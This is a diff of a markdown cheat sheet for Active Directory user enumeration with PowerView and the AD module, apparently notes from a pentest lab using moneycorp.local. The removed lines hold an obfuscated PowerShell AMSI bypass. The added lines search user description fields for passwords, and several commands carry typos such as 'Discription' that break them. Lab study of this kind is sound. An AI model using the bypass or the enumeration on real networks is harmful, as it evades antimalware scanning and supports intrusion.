@@ -1,29 +1,35 @@
-# AMSI Bypass
-To bypass AMSI (Antimalware Scan Interface):
-powershell
-
-```powershell -ep bypass```
-```SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    
-(GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
-```
-
 # PowerView Module Usage
 
-## Get a List of Users in the Current Domain
-To get a list of all users:
-```powershell
-Get-DomainUser
+# User Enumeration
+ ## Basic Enumeration of a user 
+ Get a list of users in the current domain
+ ```powershell
+ PS C:\AD\Tools> Get-NetUser   -- it will get list of all the users and default properties in current domain.
+ PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser
+ PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Filter * -Properties *
+ ```
+ All users
+ ```powershell
+PS C:\AD\Tools>  Get-NetUser | select name 
+PS C:\AD\Tools> Get-NetUser | select -ExpandProperty samaccountname
+PS C:\AD\Tools> Get-NetUser -Domain moneycorp.local | select cn  --> trusted Domain userlist
+PS C:\AD\Tools> Get-NetUser | select cn   --> current Domain user list (common name)
+PS C:\AD\Tools> Get-NetUser -Domain moneycorp.local | select cn  --> trusted Domain userlist
+PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Filter * -Properties * | select name
 ```
-To focus on a specific user (e.g., `student1`):
+Basic Enemeration on particular user
 ```powershell
-Get-DomainUser -Name student1
+PS C:\AD\Tools> Get-NetUser -UserName student157
+PS C:\AD\Tools> Get-NetUser -UserName student157 | select logoncount
+PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Identity student157
+PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Identity student157 -Properties *
 ```
-
-## Find User Accounts Used as Service Accounts
+## User properties
+Get list of all properties for users in the current domain
 ```powershell
-Get-DomainUser -SPN
+PS C:\AD\Tools> Get-UserProperty  --> current domain userproperty list
+PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Filter * -Properties *  | select -First 1 | Get-Member -MemberType *property | select name
 ```
-
 ## Get List of All Properties for Users in the Current Domain
 To get various user properties:
 ```powershell
@@ -33,6 +39,23 @@ Get-DomainUser –Properties lastlogon
 Get-DomainUser –Properties description
 Get-DomainUser -Properties samaccountname,description
 Get-DomainUser -Properties samaccountname,description,mumberof
+```
+```powershell
+PS C:\AD\Tools> Get-UserProperty -Properties pwdlastset
+PS C:\AD\Tools> Get-UserProperty -Properties badpasswordtime
+PS C:\AD\Tools> Get-UserProperty -Properties logoncount
+PS C:\AD\Tools> Get-UserProperty -Properties description
+```
+
+Search for a particular string in a user's attributes: in Discription level
+```powershell
+PS C:\AD\Tools> Find-UserField -SearchField Description -SearchTerm "built" or password etc...
+PS C:\AD\Tools\ADModule-master\ADModule-master> Get-ADUser -Filter 'Discription -like "*built*"' -Properties Description  | select Name,Discription
+PS C:\AD\Tools\ADModule-master\ADModule-master>
+```
+## Find User Accounts Used as Service Accounts
+```powershell
+Get-DomainUser -SPN
 ```
 
 ## Filter Users by Account Status
